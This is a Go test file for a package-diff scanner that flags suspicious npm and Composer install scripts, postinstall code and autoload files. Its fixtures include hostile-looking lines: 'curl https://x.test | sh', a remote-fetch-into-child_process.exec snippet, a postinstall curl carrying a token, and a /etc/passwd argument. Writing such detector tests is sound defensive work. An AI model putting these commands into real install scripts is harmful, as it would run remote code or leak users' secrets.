// Copyright (c) 2026 Rhythm Shahriar <me@rhy.io>
// SPDX-License-Identifier: MIT

package meta

import (
	"strings"
	"testing"

	"github.com/RhythmShahriar/rhythm/kit/cli"

	"github.com/RhythmShahriar/sightread/core"
	"github.com/RhythmShahriar/sightread/core/coretest"
)

func TestInstallScriptWording(t *testing.T) {
	s := subject(core.NPM)
	s.Old.Scripts = map[string]string{"install": "node-gyp rebuild"}
	s.New.Scripts = map[string]string{"install": "node-gyp rebuild && node x.js", "postinstall": "node  setup.js"}
	fs := run(t, installDetector{}, s)
	var got []string
	for _, f := range fs {
		got = append(got, f.Evidence.String()+" @"+f.File)
	}
	want := []string{"install changed: node-gyp rebuild && node x.js @package.json", "postinstall: node setup.js @package.json"}
	if len(got) != 2 || got[0] != want[0] || got[1] != want[1] {
		t.Errorf("findings = %q, want %q", got, want)
	}
}

func TestInstallScriptMasksSecrets(t *testing.T) {
	s := subject(core.NPM)
	tok := coretest.FakeKey("github")
	s.New.Scripts = map[string]string{"postinstall": "curl -H 'Authorization: token " + tok + "' https://x.test"}
	f := only(t, run(t, installDetector{}, s), SigInstallScriptNew)
	if strings.Contains(f.Evidence.String(), tok) {
		t.Errorf("evidence shows the token: %q", f.Evidence)
	}
}

func TestNodeGypAndPrepareGuards(t *testing.T) {
	for script, want := range map[string]bool{
		"node-gyp rebuild":                         true,
		"prebuild-install || node-gyp rebuild":     true,
		"node-pre-gyp install --fallback-to-build": true,
		"node-gyp rebuild && node evil.js":         false,
		"":                                         false,
	} {
		if got := nodeGyp(collapse(script)); got != want {
			t.Errorf("nodeGyp(%q) = %v", script, got)
		}
	}
	old := &core.Meta{Scripts: map[string]string{"build": "tsc", "dev": "node serve.js"}, DevDeps: map[string]string{"rollup": "^4"}}
	for script, want := range map[string]bool{
		"husky":                    true,
		"husky install":            true,
		"is-ci || husky install":   true,
		"npm run build":            true,
		"rollup -c && tsc":         true,
		"node scripts/postinst.js": false, // node ran before; it runs anything
		"npm run release":          false,
		"curl https://x.test | sh": false,
	} {
		if got := benignPrepare(script, old); got != want {
			t.Errorf("benignPrepare(%q) = %v, want %v", script, got, want)
		}
	}
}

// TestInstallCodeAnalysed covers the nested run: the file a new
// postinstall runs is analysed and the code detectors report what it
// does, once.
func TestInstallCodeAnalysed(t *testing.T) {
	setup := "require('child_process').exec(require('https').get('https://x.test/p'))\n"
	flow := coretest.Feat(core.FFlow, "remote->child_process", "", 1)
	(&coretest.FakeAnalyzer{ByText: map[string][]core.Feature{setup: {flow}}}).Install(t)

	s := subject(core.NPM)
	s.OldTree = coretest.Tree(map[string]string{"index.js": "1\n", "scripts/setup.js": setup})
	s.NewTree = s.OldTree
	s.Old.Scripts = map[string]string{}
	s.New.Scripts = map[string]string{"postinstall": "node scripts/setup.js"}
	s.OldFeatures, s.NewFeatures = core.NewFeatureSet(), core.NewFeatureSet()
	fs := run(t, installDetector{}, s)
	f := only(t, fs, "remote-fetch-exec")
	if f.File != "scripts/setup.js" || f.Severity != cli.SeverityCritical {
		t.Errorf("finding = %+v", f)
	}

	// The installed version ran the same file at install: nothing new.
	s.Old.Scripts = map[string]string{"preinstall": "node scripts/setup.js"}
	for _, f := range run(t, installDetector{}, s) {
		if f.ID == "remote-fetch-exec" {
			t.Errorf("an install code flow the old version had fired: %+v", f)
		}
	}

	// A new file the main pass already reports is not reported again.
	s.Old.Scripts = map[string]string{}
	f2 := flow
	f2.Ev.Path = "scripts/setup.js"
	s.NewFeatures = coretest.Features(f2)
	for _, f := range run(t, installDetector{}, s) {
		if f.ID == "remote-fetch-exec" {
			t.Errorf("the nested run repeated the main pass: %+v", f)
		}
	}
}

func TestScriptFiles(t *testing.T) {
	tr := coretest.Tree(map[string]string{"a.js": "1", "bin/run.sh": "x", "lib/b.js": "2"})
	got := scriptFiles(`node ./a.js && sh "bin/run.sh"; FOO=lib/b.js node ../x.js /etc/passwd`, tr)
	want := []string{"a.js", "bin/run.sh", "lib/b.js"}
	if len(got) != 3 || got[0] != want[0] || got[1] != want[1] || got[2] != want[2] {
		t.Errorf("scriptFiles = %q, want %q", got, want)
	}
}

func TestComposerWording(t *testing.T) {
	s := subject(core.Composer)
	s.New.Type = "composer-plugin"
	s.New.ComposerScripts = map[string][]string{"post-install-cmd": {"A::run", "@php x.php"}, "test": {"phpunit"}}
	fs := run(t, installDetector{}, s)
	var got []string
	for _, f := range fs {
		got = append(got, f.Evidence.String())
	}
	want := []string{"type changed from library to composer-plugin", "post-install-cmd: A::run && @php x.php"}
	if len(got) != 2 || got[0] != want[0] || got[1] != want[1] {
		t.Errorf("evidence = %q, want %q", got, want)
	}
}

func TestAutoloadLowOnlyForDefinitions(t *testing.T) {
	s := subject(core.Composer)
	s.NewTree = coretest.Tree(map[string]string{"src/h.php": "<?php function a() {}\n"})
	s.New.AutoloadFiles = []string{"./src/h.php"}
	s.NewFeatures = coretest.Features(coretest.Feat(core.FCall, "strtolower", "src/h.php", 1))
	f := only(t, run(t, installDetector{}, s), SigAutoloadFiles)
	if f.Severity != cli.SeverityLow || f.Demoted != "only defines functions" || f.Evidence.String() != "autoload.files: src/h.php" {
		t.Errorf("finding = %s %q %q", f.Severity, f.Demoted, f.Evidence)
	}
	s.NewFeatures = coretest.Features(coretest.Feat(core.FHook, "init", "src/h.php", 1))
	if f := only(t, run(t, installDetector{}, s), SigAutoloadFiles); f.Severity != cli.SeverityMedium {
		t.Errorf("a file that hooks init is %s, want medium", f.Severity)
	}
	s.NewFeatures = &core.FeatureSet{Unanalysed: []core.Unanalysed{{Path: "src/h.php", Reason: "limit"}}}
	if f := only(t, run(t, installDetector{}, s), SigAutoloadFiles); f.Severity != cli.SeverityMedium {
		t.Errorf("an unanalysed file is %s, want medium", f.Severity)
	}
}
